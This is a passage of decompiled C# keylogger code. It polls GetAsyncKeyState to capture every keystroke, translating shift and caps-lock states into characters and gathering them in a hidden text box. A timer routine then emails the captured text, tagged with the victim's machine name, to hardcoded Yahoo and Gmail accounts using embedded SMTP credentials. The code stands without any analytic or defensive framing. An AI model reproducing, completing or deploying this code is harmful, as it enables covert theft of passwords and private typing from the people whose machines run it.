					num = 205;
					obj = "+";
					goto IL_0edc;
					IL_0857:
					num = 207;
					goto IL_085e;
					IL_085e:
					num = 208;
					obj = "=";
					goto IL_0edc;
					IL_0870:
					num = 212;
					obj3 = GetAsyncKeyState(108);
					goto IL_0885;
					IL_0885:
					num = 213;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_08a0;
					}
					goto IL_08b2;
					IL_08a0:
					num = 214;
					obj = "";
					goto IL_0edc;
					IL_08b2:
					num = 217;
					obj3 = GetAsyncKeyState(109);
					goto IL_08c7;
					IL_08c7:
					num = 218;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_08e2;
					}
					goto IL_091f;
					IL_08e2:
					num = 219;
					if (!getShift())
					{
						goto IL_08f4;
					}
					goto IL_0906;
					IL_08f4:
					num = 220;
					obj = "-";
					goto IL_0edc;
					IL_0906:
					num = 222;
					goto IL_090d;
					IL_090d:
					num = 223;
					obj = "_";
					goto IL_0edc;
					IL_091f:
					num = 227;
					obj3 = GetAsyncKeyState(110);
					goto IL_0934;
					IL_0934:
					num = 228;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_094f;
					}
					goto IL_098c;
					IL_094f:
					num = 229;
					if (!getShift())
					{
						goto IL_0961;
					}
					goto IL_0973;
					IL_0961:
					num = 230;
					obj = ".";
					goto IL_0edc;
					IL_0973:
					num = 232;
					goto IL_097a;
					IL_097a:
					num = 233;
					obj = ">";
					goto IL_0edc;
					IL_098c:
					num = 237;
					obj3 = GetAsyncKeyState(111);
					goto IL_09a1;
					IL_09a1:
					num = 238;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_09bc;
					}
					goto IL_09ce;
					IL_09bc:
					num = 239;
					obj = "/";
					goto IL_0edc;
					IL_09ce:
					num = 242;
					obj3 = GetAsyncKeyState(2);
					goto IL_09e2;
					IL_09e2:
					num = 243;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_09fd;
					}
					goto IL_0a3a;
					IL_09fd:
					num = 244;
					if (!getShift())
					{
						goto IL_0a0f;
					}
					goto IL_0a21;
					IL_0a0f:
					num = 245;
					obj = "";
					goto IL_0edc;
					IL_0a21:
					num = 247;
					goto IL_0a28;
					IL_0a28:
					num = 248;
					obj = "?";
					goto IL_0edc;
					IL_0a3a:
					num = 252;
					obj3 = GetAsyncKeyState(220);
					goto IL_0a52;
					IL_0a52:
					num = 253;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0a6d;
					}
					goto IL_0aaa;
					IL_0a6d:
					num = 254;
					if (!getShift())
					{
						goto IL_0a7f;
					}
					goto IL_0a91;
					IL_0a7f:
					num = 255;
					obj = "";
					goto IL_0edc;
					IL_0a91:
					num = 257;
					goto IL_0a98;
					IL_0a98:
					num = 258;
					obj = "|";
					goto IL_0edc;
					IL_0aaa:
					num = 262;
					obj3 = GetAsyncKeyState(222);
					goto IL_0ac2;
					IL_0ac2:
					num = 263;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0add;
					}
					goto IL_0b1c;
					IL_0add:
					num = 264;
					if (!getShift())
					{
						goto IL_0aef;
					}
					goto IL_0b01;
					IL_0aef:
					num = 265;
					obj = "'";
					goto IL_0edc;
					IL_0b01:
					num = 267;
					goto IL_0b08;
					IL_0b08:
					num = 268;
					obj = '"';
					goto IL_0edc;
					IL_0b1c:
					num = 272;
					obj3 = GetAsyncKeyState(221);
					goto IL_0b34;
					IL_0b34:
					num = 273;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0b4f;
					}
					goto IL_0b8c;
					IL_0b4f:
					num = 274;
					if (!getShift())
					{
						goto IL_0b61;
					}
					goto IL_0b73;
					IL_0b61:
					num = 275;
					obj = "]";
					goto IL_0edc;
					IL_0b73:
					num = 277;
					goto IL_0b7a;
					IL_0b7a:
					num = 278;
					obj = "}";
					goto IL_0edc;
					IL_0b8c:
					num = 282;
					obj3 = GetAsyncKeyState(219);
					goto IL_0ba4;
					IL_0ba4:
					num = 283;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0bbf;
					}
					goto IL_0bfc;
					IL_0bbf:
					num = 284;
					if (!getShift())
					{
						goto IL_0bd1;
					}
					goto IL_0be3;
					IL_0bd1:
					num = 285;
					obj = "[";
					goto IL_0edc;
					IL_0be3:
					num = 287;
					goto IL_0bea;
					IL_0bea:
					num = 288;
					obj = "{";
					goto IL_0edc;
					IL_0bfc:
					num = 292;
					if (ForLoopControl.ForLoopInitObj(obj2, (object)65, (object)128, (object)1, ref obj4, ref obj2))
					{
						goto IL_0c5c;
					}
					goto IL_0d47;
					IL_0c5c:
					num = 293;
					obj3 = GetAsyncKeyState(Conversions.ToInteger(obj2));
					goto IL_0c2b;
					IL_0c2b:
					num = 294;
					if (!Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0c46;
					}
					goto IL_0c77;
					IL_0c46:
					num = 313;
					if (ForLoopControl.ForNextCheckObj(obj2, obj4, ref obj2))
					{
						goto IL_0c5c;
					}
					goto IL_0d47;
					IL_0c77:
					num = 295;
					if (!getShift())
					{
						goto IL_0c89;
					}
					goto IL_0ce3;
					IL_0c89:
					num = 296;
					if (getCapslock())
					{
						goto IL_0c98;
					}
					goto IL_0cba;
					IL_0c98:
					num = 297;
					obj = Strings.UCase(Strings.Chr(Conversions.ToInteger(obj2)));
					goto IL_0edc;
					IL_0cba:
					num = 299;
					goto IL_0cc1;
					IL_0cc1:
					num = 300;
					obj = Strings.LCase(Strings.Chr(Conversions.ToInteger(obj2)));
					goto IL_0edc;
					IL_0ce3:
					num = 303;
					goto IL_0cea;
					IL_0cea:
					num = 304;
					if (!getCapslock())
					{
						goto IL_0cfc;
					}
					goto IL_0d1e;
					IL_0cfc:
					num = 305;
					obj = Strings.UCase(Strings.Chr(Conversions.ToInteger(obj2)));
					goto IL_0edc;
					IL_0d1e:
					num = 307;
					goto IL_0d25;
					IL_0d25:
					num = 308;
					obj = Strings.LCase(Strings.Chr(Conversions.ToInteger(obj2)));
					goto IL_0edc;
					IL_0d47:
					num = 314;
					if (ForLoopControl.ForLoopInitObj(obj2, (object)48, (object)57, (object)1, ref obj5, ref obj2))
					{
						goto IL_0da4;
					}
					goto end_IL_0001_3;
					IL_0da4:
					num = 315;
					obj3 = GetAsyncKeyState(Conversions.ToInteger(obj2));
					goto IL_0d73;
					IL_0d73:
					num = 316;
					if (!Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0d8e;
					}
					goto IL_0dbf;
					IL_0d8e:
					num = 357;
					if (!ForLoopControl.ForNextCheckObj(obj2, obj5, ref obj2))
					{
						goto end_IL_0001_3;
					}
					goto IL_0da4;
					IL_0dbf:
					num = 317;
					if (getShift())
					{
						goto IL_0dd1;
					}
					goto IL_0ebd;
					IL_0dd1:
					num = 318;
					switch (Conversion.Val(Strings.Chr(Conversions.ToInteger(obj2))))
					{
					case 0:
						break;
					case 1:
						goto IL_0e30;
					case 2:
						goto IL_0e42;
					case 3:
						goto IL_0e54;
					case 4:
						goto IL_0e63;
					case 5:
						goto IL_0e72;
					case 6:
						goto IL_0e81;
					case 7:
						goto IL_0e90;
					case 8:
						goto IL_0e9f;
					case 9:
						goto IL_0eae;
					default:
						goto IL_0edc;
					}
					goto IL_0e1e;
					IL_0eae:
					num = 346;
					obj = "(";
					goto IL_0edc;
					IL_0e9f:
					num = 343;
					obj = "*";
					goto IL_0edc;
					IL_0e90:
					num = 340;
					obj = "&";
					goto IL_0edc;
					IL_0e81:
					num = 337;
					obj = "^";
					goto IL_0edc;
					IL_0e72:
					num = 334;
					obj = "%";
					goto IL_0edc;
					IL_0e63:
					num = 331;
					obj = "$";
					goto IL_0edc;
					IL_0e54:
					num = 328;
					obj = "#";
					goto IL_0edc;
					IL_0e42:
					num = 325;
					obj = "@";
					goto IL_0edc;
					IL_0e30:
					num = 322;
					obj = "!";
					goto IL_0edc;
					IL_0e1e:
					num = 349;
					obj = ")";
					goto IL_0edc;
					IL_0ebd:
					num = 352;
					goto IL_0ec4;
					end_IL_0001_2:
					break;
				}
				num = 360;
				((TextBoxBase)TxtKeys).AppendText(Conversions.ToString(obj));
				break;
				end_IL_0001:;
			}
			catch (object obj6) when (obj6 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj6);
				try0001_dispatch = 5325;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick_1(object sender, EventArgs e)
	{
		try
		{
			YahooServer();
			return;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			TxtKeys.set_Text(Environment.NewLine + ex2.Message + " [Yahoo Server]" + Environment.NewLine);
			ProjectData.ClearProjectError();
		}
		try
		{
			GmailServer();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			TxtKeys.set_Text(Environment.NewLine + ex4.Message + " [Gmail Server]" + Environment.NewLine);
			ProjectData.ClearProjectError();
		}
	}

	private void YahooServer()
	{
		SmtpServer.Credentials = new NetworkCredential("servermail44@yahoo.com", "123AAA@@@");
		SmtpServer.Port = 587;
		SmtpServer.Host = "smtp.mail.yahoo.com";
		SmtpServer.EnableSsl = false;
		mail = new MailMessage();
		mail.From = new MailAddress("servermail44@yahoo.com");
		mail.To.Add("servermail44@yahoo.com");
		mail.Subject = Environment.MachineName;
		mail.Body = TxtKeys.get_Text();
		SmtpServer.Send(mail);
		MemStream.Flush();
		MemStream = new MemoryStream(MemStream.ToArray());
	}

	private void GmailServer()
	{
		SmtpServer.Credentials = new NetworkCredential("servermail44@gmail.com", "123AAA@@@");
		SmtpServer.Port = 587;
		SmtpServer.Host = "smtp.gmail.com";
		SmtpServer.EnableSsl = true;
		mail = new MailMessage();
		mail.From = new MailAddress("servermail44@gmail.com");
		mail.To.Add("servermail44@gmail.com");
		mail.Subject = Environment.MachineName;
		mail.Body = TxtKeys.get_Text();
		SmtpServer.Send(mail);
		MemStream.Flush();
		MemStream = new MemoryStream(MemStream.ToArray());
	}
}
